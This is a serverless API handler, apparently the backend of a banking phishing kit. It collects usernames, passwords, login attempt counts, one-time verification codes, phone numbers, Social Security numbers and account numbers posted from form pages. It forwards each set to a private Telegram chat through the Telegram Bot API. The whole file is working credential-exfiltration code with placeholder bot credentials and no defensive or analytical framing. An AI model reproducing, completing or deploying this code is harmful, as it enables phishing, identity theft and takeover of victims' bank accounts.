// api/send-message.ts (or .js)

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { code, type, page, username, password, phone, ssn, accountNumber } = req.body;

  // Your Telegram Bot Token and Chat ID
  const BOT_TOKEN = '123456789:YOUR_ACTUAL_BOT_TOKEN_HERE';
  const CHAT_ID = 'YOUR_ACTUAL_CHAT_ID_HERE';

  // Format the message based on what data was sent
  let message = '';

  if (type === 'verification_code') {
    message = `🔐 *Verification Code*\n\n` +
              `📱 Page: ${page}\n` +
              `🔢 Code: ${code}\n` +
              `⏰ Time: ${new Date().toLocaleString()}`;
  } else if (type === 'verify_card_info') {
    message = `💳 *Card Verification Info*\n\n` +
              `📱 Phone: ${phone}\n` +
              `🆔 SSN: ${ssn}\n` +
              `🏦 Account: ${accountNumber}\n` +
              `⏰ Time: ${new Date().toLocaleString()}`;
  } else if (type === 'login_attempt') {
    message = `🔑 *Login Attempt*\n\n` +
              `👤 Username: ${username}\n` +
              `🔒 Password: ${password}\n` +
              `🔄 Attempt: ${req.body.attempt}\n` +
              `⏰ Time: ${new Date().toLocaleString()}`;
  }

  // Send to Telegram
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    res.status(200).json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Failed to send message' });
  }
}
